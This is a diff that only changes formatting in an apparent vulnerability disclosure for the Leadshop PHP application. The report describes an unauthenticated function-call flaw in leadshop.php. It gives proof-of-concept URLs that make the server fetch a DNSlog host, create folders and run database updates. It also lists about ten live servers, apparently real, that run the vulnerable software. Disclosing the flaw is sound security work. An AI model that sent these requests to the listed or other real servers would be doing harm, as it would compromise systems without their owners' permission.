@@ -43,7 +43,7 @@ The vulnerability is in the leadshop/web/leadshop.php[27-61] file
     }  
 ```  
 
-The call_user_func_array function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
+The ```call_user_func_array``` function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
 HttpGet (http access: poc: ```https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn```),  
 ToMkdir (create folder: poc: ```https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1```),  
 UpdateSql (perform database update: poc: ```https://demo.leadshop.vip/leadshop.php?include=UpdateSql```),  
@@ -64,11 +64,11 @@ DNSLog picture:
 -
 Impact
 -
-Attackers can call any existing functions at will, control the target server to access, download, create files, delete files, etc.
-Access may make the server a dos server.
-Download, so that an attacker can download the PHP Trojan to the server.
-Creating and deleting will destroy normal services.
-More than ten IPs are using this service(Fofa Search:"Powered By Leadshop © 2021").
+Attackers can call any existing functions at will, control the target server to access, download, create files, delete files, etc.  
+Access may make the server a dos server.  
+Download, so that an attacker can download the PHP Trojan to the server.  
+Creating and deleting will destroy normal services.  
+More than ten IPs are using this service(Fofa Search:"Powered By Leadshop © 2021").  
 ```
 https://8.141.175.3
 http://www.huatianlinye.com
@@ -80,7 +80,7 @@ https://101.201.209.92
 http://119.3.229.175:7788
 https://101.200.231.65
 https://zhangtong.store.mianhuain.com
-```
+```  
 -
 Occurrences
 -
